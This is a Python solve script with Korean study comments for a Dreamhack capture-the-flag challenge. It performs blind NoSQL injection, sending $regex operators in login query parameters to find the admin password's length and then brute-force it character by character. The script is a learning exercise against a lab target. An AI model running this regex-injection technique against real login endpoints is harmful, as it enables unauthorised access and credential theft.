import requests
import string

# flag is in db, {'uid': 'admin', 'upw': 'DH{32alphanumeric}'}

HOST = 'http://host3.dreamhack.games:12512'
ALPHANUMERIC = string.digits + string.ascii_letters  # 0123456789 + abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
SUCCESS = 'admin'

# 1. 비밀번호 길이 구하기
# 첫 번째 방법
pw_len = 1
while True:
    response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{.{{{pw_len}}}}}')  # D.{.{pw_len}}로 시작

    # response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{.{{{pw_len}}}') # D.{.{pw_len}로 시작하므로 1부터 됨
    # response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=.{{{pw_len}}}') # 이것도 마찬가지로 .{pw_len}로 시작하므로 1부터 됨

    if response.text == SUCCESS:
        break
    pw_len = pw_len + 1

print(f'Password length is {pw_len}')

# 두 번째 방법
pw_len = 1
while True:
    # D.{.{pw_len}로 시작 : 마지막 문자인 '}'를 빼주고 'pw_len - 1'을 출력해야 하므로 -2를 빼주면 됨
    response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{.{{{pw_len}}}')

    # response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=.{{{pw_len}}}')
    # 이건 첫글자부터 시작하기 때문에, (pw_len - 5)를 출력해야함(DH{} 총 4글자)

    if response.text != SUCCESS:
        break
    pw_len = pw_len + 1

print(f'Password length is {pw_len - 2}')
# print(f'Password length is {pw_len - 5}')


# 2. 비밀번호 구하기
flag = ''

for i in range(pw_len):
    for ch in ALPHANUMERIC:
        response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}')
        # response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=^D.{{{flag}{ch}')
        if response.text == SUCCESS:
            flag += ch
            break

    print(f'FLAG: DH{{{flag}}}')
